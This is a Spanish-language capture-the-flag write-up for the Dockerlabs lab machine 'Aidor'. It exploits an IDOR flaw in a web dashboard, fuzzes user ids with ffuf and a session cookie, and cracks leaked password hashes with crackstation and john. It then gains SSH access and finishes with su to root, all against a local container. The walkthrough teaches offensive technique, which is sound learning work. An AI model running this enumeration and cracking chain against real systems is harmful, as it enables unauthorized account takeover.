---
title: Aidor - Easy (Dockerlabs)
permalink: /Aidor-Dockerlabs-Writeup/
tags:
  - Linux
  - Easy
  - IDOR
  - "Hash Cracking"
  - "Credentials Leakage"
categories:
  - writeup
  - hacking
  - dockerlabs
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Aidor - Easy (Dockerlabs)
seo_description: Aprende a explotar la vulnerabilidad IDOR en un sitio web para vencer Aidor.
excerpt: Aprende a explotar la vulnerabilidad IDOR en un sitio web para vencer Aidor.
header:
  overlay_image: /assets/images/headers/aidor-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/aidor-dockerlabs.jpg
---
![image-center](/assets/images/posts/aidor-dockerlabs.png)
{: .align-center}

**Habilidades:** Insecure Direct Object Reference (IDOR), URL Parameter Fuzzing, Hash Cracking, Credentials Leakage
{: .notice--primary}

# Introducción

Adior es una máquina de dificultad `Easy` en la plataforma `Dockerlabs`, donde debemos vulnerar un sitio web a través de la vulnerabilidad IDOR, la cual nos permitirá acceso inicial descifrando credenciales.

La escalada de privilegios será a través de filtrado de información de la contraseña del usuario `root`.
<br>
# Reconocimiento
---
## Nmap Scanning 

Comenzaremos lanzando un escaneo con `nmap` que nos ayude a identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 19:21 -03
Nmap scan report for 172.17.0.2
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
5000/tcp  open  upnp

Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Lanzaremos un segundo escaneo a los puertos descubiertos con el fin de identificar la versión y los servicios que se ejecutan en ellos

~~~ bash
nmap -p 22,5000 -sVC 172.17.0.2 -oN services

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 19:28 -03
Nmap scan report for localhost (172.17.0.2)
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: Uso de scripts de reconocimiento 
- `-oN`: Exportar en formato normal (tal como se ve por consola)

Vemos dos servicios expuestos, `ssh` y `http`, donde las versiones de estas tecnologías no parecen contar con vulnerabilidades públicas


## Web Analysis

Podemos hacer un escaneo de las tecnologías web para intentar identificar servicios que ejecuta el servidor HTTP, como algún gestor de contenido, lenguaje de programación, etc.

``` bash
whatweb http://172.17.0.2:5000 

http://172.17.0.2:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.13.5], IP[172.17.0.2], PasswordField[password], Python[3.13.5], Script, Title[Iniciar Sesión], Werkzeug[3.1.3]
```

Al navegar hasta la web, notaremos que se trata de un panel de inicio de sesión a una plataforma

![image-center](/assets/images/posts/aidor-1-dockerlabs.png)
{: .align-center}

Podemos registrar una cuenta para iniciar sesión con ella de forma automática

![image-center](/assets/images/posts/aidor-2-dockerlabs.png)
{: .align-center}
<br>


# Explotación
---
## Insecure Direct Object Reference (IDOR)

> Se trata de una vulnerabilidad de seguridad de aplicaciones web que se produce cuando un usuario puede **acceder o manipular objetos** (como datos de la base de datos, archivos o registros) sin la debida autorización, simplemente cambiando un identificador en una solicitud.
{: .notice--info}

Si ponemos atención en la URL, veremos cómo se refleja el valor de nuestro `id` de usuario, que en este caso es el `55`

``` bash
http://172.17.0.2:5000/dashboard?id=55#
```

Además de que dentro de la web, veremos la contraseña actual en formato hash

![image-center](/assets/images/posts/aidor-3-dockerlabs.png)
{: .align-center}

Si intentamos aplicar unas pruebas manuales cambiando el valor `id`, podremos llegar a ver la información de otros usuarios válidos

``` bash
http://172.17.0.2:5000/dashboard?id=54#
```

Veremos a un usuario llamado `aidor` al cambiar el `id` a `54`

![image-center](/assets/images/posts/aidor-4-dockerlabs.png)
{: .align-center}


## URL Parameter Fuzzing

Ya con esto podríamos avanzar, pero como la idea es automatizarlo, podemos usar herramientas como `gobuster`, `ffuf` o `wfuzz` para intentar hacer `Fuzzing` a este parámetro y obtener de forma rápida usuarios válidos

### Understanding the Scenario

Antes de usar alguna herramienta debemos considerar usar la cookie de sesión que nos identifica en la web, de lo contrario no podremos listar usuarios (en este caso la `cookie` se llama `session`).

> Una `cookie` de sesión es un valor temporal que se almacena en tu navegador para mantener tu sesión activa en un sitio web, eliminándose automáticamente cuando cierras la ventana del navegador o sales de la cuenta.
{: .notice--info}

![image-center](/assets/images/posts/aidor-5-dockerlabs.png)
{: .align-center}

Podemos ir haciendo pruebas con valores que sabemos que no existen para conocer un filtro a aplicar

``` bash
# Usuario válido
curl -I 'http://172.17.0.2:5000/dashboard?id=55#' -b 'eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs'
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.5
Date: Wed, 19 Nov 2025 22:50:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 23527
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjo1NX0.aR5J0Q.Fg8USIALPlbJ5oLI75NByX0A4_0; HttpOnly; Path=/
Connection: close

# Forzar un usuario que no exsite
curl -I 'http://172.17.0.2:5000/dashboard?id=noexiste#' -b 'eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs' 
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.3 Python/3.13.5
Date: Wed, 19 Nov 2025 22:51:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Connection: close
```

En este caso cuando el valor no existe se aplica una redirección, podríamos aplicar un filtro a este código de estado, el cual se reconoce como `302`.

> El código de estado HTTP `302 Found` indica que el recurso solicitado ha sido redirigido temporalmente a otra URL.
{: .notice--info}

Considerando que el patrón es predecible, en vez de usar un diccionario, podemos crearlo con una secuencia del `1` al `100`

``` bash
for i in $(seq 1 100); do echo "$i"; done > numbers.txt 
```

### Fuzzing

En mi caso utilicé la herramienta `ffuf` para automatizar el `fuzzing`, donde aplicaremos un filtro, eliminando las respuestas cuando estas respondan con el código `302 Found`.

Esto nos indica que cuando veamos valores diferentes es porque posiblemente el `id` corresponda a un usuario válido

``` bash
ffuf -b 'session=eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs' -fc 302 -w numbers.txt -u 'http://172.17.0.2:5000/dashboard?id=FUZZ#'
```

- `-fc`: No mostrar las respuestas que coincidan en base a un código de estado HTTP

Con este comando obtendremos muchas cuentas válidas, las cuales son cuentas basura, debido a que anteriormente notamos la existencia de la cuenta `aidor`, la cual es muy probable que sea válida a nivel de sistema.

Podemos filtrar esta gran cantidad de nombres de cuenta aplicando una pequeña expresión regular

``` bash
curl -s 'http://172.17.0.2:5000/dashboard?id=24' -b 'session=eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs' | grep -E 'Bienvenido, [a-z]+\.[a-z]+'
                    <h2>Bienvenido, monica.ramirez</h2>

# Cuando consultamos un usuario diferente a este patrón  
curl -s 'http://172.17.0.2:5000/dashboard?id=55' -b 'session=eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs' | grep -E 'Bienvenido, [a-z]+\.[a-z]+'
```

Ya conocemos un valor que diferencia las cuentas de usuario, por lo que podemos usar este filtro para no mostrarlo cuando existan estas coincidencias

``` bash
ffuf -b 'session=eyJ1c2VyX2lkIjo1NX0.aR5Jww.d3Xypcvr1Lh5Fjfu8a9CdDHgSZs' -fc 302 -fr 'Bienvenido, [a-z]+\.[a-z]+' -w numbers.txt -u 'http://172.17.0.2:5000/dashboard?id=FUZZ#'


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2:5000/dashboard?id=FUZZ#
 :: Wordlist         : FUZZ: /Users/andrees/machines/dockerlabs/aidor/content/numbers.txt
 :: Header           : Cookie: session=eyJ1c2VyX2lkIjo1MX0.aRv1qA.m7jjMJ_TFMVraeieJba_2FhqEOk
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
 :: Filter           : Regexp: Bienvenido, [a-z]+\.[a-z]+
________________________________________________

27                      [Status: 200, Size: 23471, Words: 9427, Lines: 746, Duration: 160ms]
55                      [Status: 200, Size: 23527, Words: 9427, Lines: 746, Duration: 147ms]
53                      [Status: 200, Size: 23512, Words: 9427, Lines: 746, Duration: 174ms]
54                      [Status: 200, Size: 23516, Words: 9427, Lines: 746, Duration: 188ms]
52                      [Status: 200, Size: 23516, Words: 9427, Lines: 746, Duration: 227ms]
```

 - `-fr`: Buscar una coincidencia en el cuerpo de la respuesta en base a una expresión regular


## Hash Cracking

Volvamos a la web, donde podemos extraer el valor de las contraseñas para estas cuentas, los cuales se muestran cifrados en formato hash.

 Podemos usar herramientas como [`crackstation.net`](https://crackstation.net/) para descifrar estos hashes vía web rápidamente

![image-center](/assets/images/posts/aidor-6-dockerlabs.png)
{: .align-center}

Las contraseñas encontradas son muy descriptivas con el nombre de usuario, excepto la última que corresponde al usuario `aidor`, donde su contraseña es `chocolate`

``` text
aidor:chocolate
```


## Shell as `aidor`

Con estas credenciales podremos conectarnos por `ssh` al contenedor como el usuario `aidor`

~~~ bash
ssh aidor@172.17.0.2
aidor@localhost\'s password: 
...
<SNIP>
...
Last login: Tue Nov 18 01:54:09 2025 from 172.17.0.1
aidor@54f83586c9ed:~$ 
~~~

De forma inmediata, podemos asignar un valor a la variable `TERM` que nos permita limpiar la pantalla con `Ctrl+L`

``` bash
aidor@54f83586c9ed:~$ export TERM=xterm
```
<br>


# Escalada de privilegios
---
## Users

Si enumeramos los usuarios del sistema, notaremos que solamente queda el usuario `root`, por lo que debemos escalar privilegios de forma directa

``` bash
aidor@425436197f4b:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
aidor:x:1000:1000:aidor,,,:/home/aidor:/bin/bash
```


## Credentials Leakage

Si listamos `/home`, encontraremos los archivos de la web allí

``` bash
aidor@54f83586c9ed:~$ ls /home 
aidor  app.py  database.db  templates
```

Viendo el contenido del archivo `app.py` encontraremos algo inusual, se muestra un comentario que parece tener unas credenciales cifradas

``` bash
aidor@54f83586c9ed:~$ cat /home/app.py

from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
import hashlib
import os

...
<SNIP>
...
        # Insertar un usuario de ejemplo si la tabla está vacía
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        # if count == 0:
        #     cursor.execute('''
        #     INSERT INTO users (username, password, email) VALUES
        #     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
        #     ''')  # La contraseña "admin" es hash SHA-256
        conn.commit()
        conn.close()

@app.route('/', methods=['GET', 'POST'])
def index():
```


## Hash Cracking

Claramente parece otro hash, lo guardaremos en un archivo y volveremos a intentar descifrarlo con herramientas com `john` o `hashcat`

~~~ bash
echo 'aa87ddc5b4c24406d26ddad771ef44b0' > hash.txt

john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt --format=raw-MD5-opencl    
                      
Device 2: HD Graphics 4000
Using default input encoding: UTF-8
Loaded 1 password hash (raw-MD5-opencl [MD5 OpenCL])
Error creating binary cache file: No such file or directory
Note: This format may be a lot faster with --mask acceleration (see doc/MASK).
Error creating binary cache file: No such file or directory
Press 'q' or Ctrl-C to abort, almost any other key for status
estrella         (?)
1g 0:00:00:00 DONE (2025-11-19 20:30) 2.380g/s 2496Kp/s 2496Kc/s 2496KC/s estrella..Leonela
Use the "--show --format=raw-MD5-opencl" options to display all of the cracked passwords reliably
Session completed
~~~

Hemos encontrado la credencial `estrella`, la cual supuestamente es válida para el usuario `root`


## Root time

Podremos cambiar al usuario root directamente dentro del contenedor empleando el comando `su`

``` bash
aidor@54f83586c9ed:~$ su
Password: 
root@54f83586c9ed:/home/aidor# id
uid=0(root) gid=0(root) groups=0(root)
```

> Just as much as we see in others we have in ourselves.
> — William Hazlitt
{: .notice--info}